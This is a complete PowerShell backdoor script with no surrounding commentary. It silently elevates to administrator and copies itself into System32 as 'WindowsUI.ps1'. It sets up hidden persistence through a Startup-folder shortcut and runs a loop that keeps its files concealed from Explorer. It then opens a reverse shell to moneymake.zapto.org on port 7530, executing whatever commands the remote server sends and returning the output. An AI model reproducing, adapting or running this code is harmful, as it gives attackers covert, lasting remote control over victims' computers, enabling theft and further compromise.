if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
$currentScriptFullPath = (Get-Item $PSCommandPath).FullName
$targetScriptPath = "C:\Windows\System32\WindowsUI.ps1"
$targetExists = Test-Path $targetScriptPath
$targetCanonicalPath = $null
if ($targetExists) {
    $targetCanonicalPath = (Get-Item $targetScriptPath).FullName
}

if (-not $targetExists -or -not ([string]::Equals($currentScriptFullPath, $targetCanonicalPath, [System.StringComparison]::InvariantCultureIgnoreCase))) {
    Copy-Item -Path $currentScriptFullPath -Destination $targetScriptPath -Force
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetScriptPath`"" -Verb RunAs
    if (-not ([string]::Equals($currentScriptFullPath, (Get-Item $targetScriptPath).FullName, [System.StringComparison]::InvariantCultureIgnoreCase))) {
        Remove-Item -Path $currentScriptFullPath -Force
    }
    exit
}
$startupPath = [Environment]::GetFolderPath([System.Environment+SpecialFolder]::CommonStartup)
$shortcutPath = Join-Path $startupPath "WindowsUI.lnk"
attrib +s +h $targetScriptPath | Out-Null
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetScriptPath`""
$shortcut.WorkingDirectory = "C:\Windows\System32"
$shortcut.Save()
attrib +s +h $shortcutPath | Out-Null

$attribJobScript = {
    param($scriptPath, $lnkPath)
    while ($true) {
        attrib +s +h $scriptPath | Out-Null
        attrib +s +h $lnkPath | Out-Null
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 0 -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
    }
}
Start-Job -ScriptBlock $attribJobScript -ArgumentList $targetScriptPath, $shortcutPath | Out-Null
$global:subSession = [powershell]::Create()
$global:subSession.Runspace.SessionStateProxy.Path.SetLocation("C:\")

function Reset-SubSession {
    if ($global:subSession -ne $null) {
        $global:subSession.Dispose()
    }
    $global:subSession = [powershell]::Create()
    $global:subSession.Runspace.SessionStateProxy.Path.SetLocation("C:\")
}

function Execute-SubCommand {
    param([string]$cmd)
    $fullCmd = "$cmd; Write-Output 'CURRENT_DIR:' + (Get-Location)"
    $global:subSession.Commands.Clear()
    $global:subSession.AddScript($fullCmd) | Out-Null
    try {
        $result = $global:subSession.Invoke() | Out-String
        return $result
    } catch {
        return "Error executing command: $_"
    }
}

function Connect-ToServer {
    param(
        [string]$server,
        [int]$port
    )
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($server, $port)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.WriteLine("OS: windows")
            $heartbeatJob = Start-Job -ScriptBlock {
                param($stream)
                $sw = New-Object System.IO.StreamWriter($stream)
                $sw.AutoFlush = $true
                while ($true) {
                    Start-Sleep -Milliseconds 500
                    try {
                        $sw.WriteLine("PING")
                    } catch {
                        break
                    }
                }
            } -ArgumentList $stream
            
            while ($client.Connected -and -not $reader.EndOfStream) {
                $line = $reader.ReadLine()
                if ($null -eq $line) { break }
                if ($line -match '--reset\b') {
                    $cmdToRun = $line -replace '--reset\b',''
                    $cmdToRun = $cmdToRun.Trim()
                    Reset-SubSession
                    $res = if ($cmdToRun -ne "") { Execute-SubCommand $cmdToRun } else { "Sub-session reset." }
                    $writer.WriteLine("OUTPUT:" + $res)
                } else {
                    $res = Execute-SubCommand $line
                    $writer.WriteLine("OUTPUT:" + $res)
                }
            }
            Stop-Job $heartbeatJob -Force | Out-Null
            $client.Close()
        } catch {}
        Start-Sleep -Milliseconds 100
    }
}

Connect-ToServer -server "moneymake.zapto.org" -port 7530
